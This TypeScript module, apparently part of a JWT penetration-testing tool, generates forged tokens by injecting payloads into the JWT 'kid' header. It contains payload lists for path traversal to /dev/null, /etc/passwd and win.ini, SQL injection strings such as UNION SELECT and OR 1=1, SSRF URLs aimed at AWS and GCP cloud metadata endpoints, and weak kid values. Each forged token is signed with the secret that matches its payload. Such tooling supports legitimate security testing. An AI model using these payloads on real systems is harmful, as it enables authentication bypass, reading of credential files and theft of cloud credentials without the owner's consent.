/**
 * KID (Key ID) Injection Attacks
 *
 * Manipulates the "kid" JWT header parameter to:
 *  - SQL injection (if the server looks up the key from a DB)
 *  - Path traversal (if the server reads a key file by kid)
 *  - SSRF via absolute URL (if the server fetches the key by kid)
 *  - Known weak/predictable kid values
 *
 * For SQL and path traversal payloads we also sign with a known "secret"
 * that corresponds to the injected payload (e.g. /dev/null = empty file,
 * so HMAC secret = empty string).
 */

import { signHMAC, encodeUnsigned, buildJWT } from "../crypto/jwt.js";
import type { ParsedJWT, AttackResult } from "../types.js";
import { nanoid } from "../util.js";

interface KidPayload {
  kid: string;
  secret: Buffer;
  description: string;
}

const PATH_TRAVERSAL_KIDS: KidPayload[] = [
  {
    kid: "../../../../dev/null",
    secret: Buffer.from(""),
    description: "Path traversal to /dev/null (empty secret)",
  },
  {
    kid: "../../../../../../dev/null",
    secret: Buffer.from(""),
    description: "Deeper path traversal to /dev/null (empty secret)",
  },
  {
    kid: "/dev/null",
    secret: Buffer.from(""),
    description: "Absolute path /dev/null (empty secret)",
  },
  {
    kid: "../../../../proc/sys/kernel/randomize_va_space",
    secret: Buffer.from("2"),
    description: "Path traversal to Linux kernel file (typical content: '2')",
  },
  {
    kid: "../../../../etc/passwd",
    secret: Buffer.from(""),
    description: "Path traversal to /etc/passwd",
  },
  {
    kid: "../../../../windows/win.ini",
    secret: Buffer.from(""),
    description: "Path traversal to Windows win.ini",
  },
];

const SQL_INJECTION_KIDS: KidPayload[] = [
  {
    kid: "' UNION SELECT 'secret'-- -",
    secret: Buffer.from("secret"),
    description: "SQL UNION injection returning 'secret' as the key",
  },
  {
    kid: "' UNION SELECT 'a'-- -",
    secret: Buffer.from("a"),
    description: "SQL UNION injection returning 'a' as the key",
  },
  {
    kid: "' OR '1'='1",
    secret: Buffer.from(""),
    description: "SQL OR injection (tautology)",
  },
  {
    kid: "1 OR 1=1",
    secret: Buffer.from(""),
    description: "SQL numeric OR injection",
  },
  {
    kid: "\" UNION SELECT 'secret'-- -",
    secret: Buffer.from("secret"),
    description: "SQL UNION injection (double-quote variant)",
  },
];

const SSRF_KIDS: KidPayload[] = [
  {
    kid: "http://169.254.169.254/latest/meta-data/",
    secret: Buffer.from(""),
    description: "SSRF to AWS IMDSv1 metadata endpoint",
  },
  {
    kid: "http://metadata.google.internal/computeMetadata/v1/",
    secret: Buffer.from(""),
    description: "SSRF to GCP metadata endpoint",
  },
  {
    kid: "http://localhost/",
    secret: Buffer.from(""),
    description: "SSRF to localhost",
  },
];

const WEAK_KIDS: KidPayload[] = [
  {
    kid: "0",
    secret: Buffer.from("secret"),
    description: "Kid=0 with secret='secret'",
  },
  {
    kid: "1",
    secret: Buffer.from("secret"),
    description: "Kid=1 with secret='secret'",
  },
  {
    kid: "",
    secret: Buffer.from(""),
    description: "Empty kid with empty secret",
  },
];

function buildHSAttack(
  parsed: ParsedJWT,
  payload: KidPayload,
  category: string
): AttackResult {
  const alg = (parsed.header.alg as string).startsWith("HS")
    ? (parsed.header.alg as "HS256" | "HS384" | "HS512")
    : "HS256";

  const header = { ...parsed.header, alg, kid: payload.kid };
  const jwt = signHMAC(header, parsed.payload, payload.secret, alg);

  return {
    id: nanoid(),
    technique: "kidInject",
    techniqueName: `KID Injection — ${category}`,
    description: `Injects kid="${payload.kid}" — ${payload.description}`,
    modifiedJWT: jwt,
    timestamp: Date.now(),
    hmacSecret: payload.secret.toString("utf8"),
  };
}

export function buildKIDInjectionAttacks(parsed: ParsedJWT): AttackResult[] {
  const results: AttackResult[] = [];

  for (const payload of PATH_TRAVERSAL_KIDS) {
    results.push(buildHSAttack(parsed, payload, "Path Traversal"));
  }
  for (const payload of SQL_INJECTION_KIDS) {
    results.push(buildHSAttack(parsed, payload, "SQL Injection"));
  }
  for (const payload of SSRF_KIDS) {
    results.push(buildHSAttack(parsed, payload, "SSRF"));
  }
  for (const payload of WEAK_KIDS) {
    results.push(buildHSAttack(parsed, payload, "Weak KID"));
  }

  return results;
}
